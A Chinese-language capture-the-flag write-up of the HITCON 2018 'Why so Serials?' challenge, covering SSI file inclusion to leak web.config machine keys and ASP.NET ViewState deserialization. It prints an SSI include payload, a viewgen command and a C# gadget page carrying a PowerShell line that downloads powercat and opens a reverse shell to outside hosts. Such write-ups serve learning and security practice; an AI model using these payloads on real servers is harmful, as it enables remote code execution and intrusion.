---
title: HITCON 2018 Writeup
categories:
  - 比赛Writeup
tags:
  - ctf
  - Writeup
index_img: /img/used/comp.jpg
date: 2020-7-14 05:23:22
---

## HITCON 2018

### babe cake



### Why-So-Serials（asp viewState漏洞）

### 知识点

+ 利用SSI进行LFI
+ asp的ViewState性质
+ 搭建和配置IIS服务器

### 参考资料

[如何借助ViewState在ASP.NET中实现反序列化漏洞利用](https://www.4hou.com/posts/GYq7)

[HITCON 2018: Why so Serials? Write-up](https://cyku.tw/ctf-hitcon-2018-why-so-serials/)

[服务器端内嵌](https://zh.wikipedia.org/wiki/服务器端内嵌)

题目只给了一个文件上传页面和源码。

```asp
<%@ Page Language="C#" %>
<script runat="server">
    protected void Button1_Click(object sender, EventArgs e) {
        if (FileUpload1.HasFile) {
            try {
                System.Web.HttpContext context = System.Web.HttpContext.Current;
                String filename = FileUpload1.FileName;
                String extension = System.IO.Path.GetExtension(filename).ToLower();
                String[] blacklists = {".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap", ".vbhtm", ".vbhtml", ".asa", ".asp", ".cer"};
                if (blacklists.Any(extension.Contains)) {
                    Label1.Text = "What do you do?";
                } else {
                    String ip = context.Request.ServerVariables["REMOTE_ADDR"];
                    String upload_base = Server.MapPath("/") + "files/" + ip + "/";
                    if (!System.IO.Directory.Exists(upload_base)) {
                        System.IO.Directory.CreateDirectory(upload_base);
                    }

                    filename = Guid.NewGuid() + extension;
                    FileUpload1.SaveAs(upload_base + filename);

                    Label1.Text = String.Format("<a href='files/{0}/{1}'>This is file</a>", ip, filename);
                }
            }
            catch (Exception ex)
            {
                Label1.Text = "ERROR: " + ex.Message.ToString();
            }
        } else {
            Label1.Text = "You have not specified a file.";
        }
    }
</script>

<!DOCTYPE html>
<html>
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="stylesheet" type="text/css" href="bootstrap.min.css">
    <title>Why so Serials?</title>
</head>
<body>
  <div class="container">
    <div class="jumbotron" style='background: #f7f7f7'>
        <h1>Why so Serials?</h1>
        <p>May the <b><a href='Default.aspx.txt'>source</a></b> be with you!</p>
        <br />
        <form id="form1" runat="server">
            <div class="input-group">
                <asp:FileUpload ID="FileUpload1" runat="server" class="form-control"/>
                <span class="input-group-btn">
                    <asp:Button ID="Button1" runat="server" OnClick="Button1_Click"
                 Text="GO" class="btn"/>
                </span>
            </div>
            <br />
            <br />
            <br />
            <div class="alert alert-primary text-center">
                <asp:Label ID="Label1" runat="server"></asp:Label>
            </div>
        </form>
    </div>
  </div>
</body>
</html>
```

这题是asp题目，我对asp了解为零...只好看[wp](https://cyku.tw/ctf-hitcon-2018-why-so-serials/)学操作了。

题目过滤了很多上传的后缀，如wp开始部分所叙述的，有一种办法可以查看各种后缀被IIS处理的方法，即IIS的Handler Mapping。

![UN72yF.png](https://s1.ax1x.com/2020/07/14/UN72yF.png)

发现列表中并没有禁用`.stm`, `.shtm`和`.shtml`三种文件格式, 于是我们可以通过这两种文件来进行SSI(Server Side Include), 从而读取web.config（IIS配置文件）。

```
<!-- test.shtml -->
<!--#include file="/web.config" -->
```

读取下来

```html
<configuration>
<system.web>
<customerrors mode="Off">
    <machinekey validationkey="b07b0f97365416288cf0247cffdf135d25f6be87" decryptionkey="6f5f8bd0152af0168417716c0ccb8320e93d0133e9d06a0bb91bf87ee9d69dc3" decryption="DES" validation="MD5">
</machinekey></customerrors></system.web>
</configuration>
```

看到了熟悉的validation key，显然是view state的反序列化漏洞。

https://www.4hou.com/posts/GYq7（漏洞介绍）

 https://github.com/pwntester/ysoserial.net （利用工具）

https://github.com/0xacb/viewgen.git（利用工具）

[解码ViewState的网站](https://www.secshi.com/goto/hyh9)

ViewState参数([参考链接](https://www.secshi.com/goto/bc6d))

viewstate是前端传入了加密参数到后端，后端进行反序列化，我们如果窃取了密钥则可以主动构造这个参数。(直接在自己服务器上搭建asp，或者使用viewgen进行操作)

使用viewgen生成payload的话，要注意  需要把machineKey和validationKey的k变成大写的，不然程序会报错

```
./viewgen --webconfig web.config -m CA0B0334 -c "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 122.51.141.127 -p 6666 -e cmd" > exp
```

正常反弹shell这样就行了，但是这里使用了签名算法来验证viewstate，我们需要自己搭建IIS服务器，生成这个viewstate和对应的签名。

下面是wp中修改后的Default.aspx脚本，修改了import，增加了第二个按钮和规则，需要一些asp开发知识。

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Runtime.Serialization" %>
<%@ Import Namespace="System.Web.UI" %>
<%@ Import Namespace="System.Linq" %>
<script runat="server">
    protected void Button1_Click(object sender, EventArgs e) {
        if (FileUpload1.HasFile) {
            try {
                System.Web.HttpContext context = System.Web.HttpContext.Current;
                String filename = FileUpload1.FileName;
                String extension = System.IO.Path.GetExtension(filename).ToLower();
                String[] blacklists = {".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap", ".vbhtm", ".vbhtml", ".asa", ".asp", ".cer"};
                if (blacklists.Any(extension.Contains)) {
                    Label1.Text = "What do you do?";
                } else {
                    String ip = context.Request.ServerVariables["REMOTE_ADDR"];
                    String upload_base = Server.MapPath("/") + "files/" + ip + "/";
                    if (!System.IO.Directory.Exists(upload_base)) {
                        System.IO.Directory.CreateDirectory(upload_base);
                    }

                    filename = Guid.NewGuid() + extension;
                    FileUpload1.SaveAs(upload_base + filename);

                    Label1.Text = String.Format("<a href='files/{0}/{1}'>This is file</a>", ip, filename);
                }
            }
            catch (Exception ex)
            {
                Label1.Text = "ERROR: " + ex.Message.ToString();
            }
        } else {
            Label1.Text = "You have not specified a file.";
        }
    }
  protected void Button2_Click(object sender, EventArgs e) {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c reverse.lvm.me -p 6666 -e cmd");
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);
            ViewState["test"] = set;
    }
</script>

<!DOCTYPE html>
<html>
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="stylesheet" type="text/css" href="bootstrap.min.css">
    <title>Why so Serials?</title>
</head>
<body>
  <div class="container">
    <div class="jumbotron" style='background: #f7f7f7'>
        <h1>Why so Serials?</h1>
        <p>May the <b><a href='Default.aspx.txt'>source</a></b> be with you!</p>
        <br />
        <form id="form1" runat="server">
            <div class="input-group">
                <asp:FileUpload ID="FileUpload1" runat="server" class="form-control"/>
                <span class="input-group-btn">
                    <asp:Button ID="Button1" runat="server" OnClick="Button1_Click"
                 Text="GO" class="btn"/>
                  <asp:Button ID="Button2" runat="server" OnClick="Button2_Click" 
                    Text="TEST" class="btn"/>
                </span>
            </div>
            <br />
            <br />
            <br />
            <div class="alert alert-primary text-center">
                <asp:Label ID="Label1" runat="server"></asp:Label>
            </div>
        </form>
    </div>
  </div>
</body>
</html>
```

我们重点关注这一句

```
 set.Add("/c " + "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c reverse.lvm.me -p 6666 -e cmd");
```

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd
```

这句是powershell反弹shell的标准语句。[powershell 反弹shell](https://www.cnblogs.com/-mo-/p/11487997.html)

其中的powercat是netcat的powershell版本，我们尝试下载它。下载就需要System.Net.Webclient的支持。

[IIS的搭建教程](https://blog.csdn.net/qq_36348823/article/details/81367819)

搭建好IIS，我们模拟一下网页ViewState的生成过程即可。然后把生成的viewstate发送，就可以反弹shell。

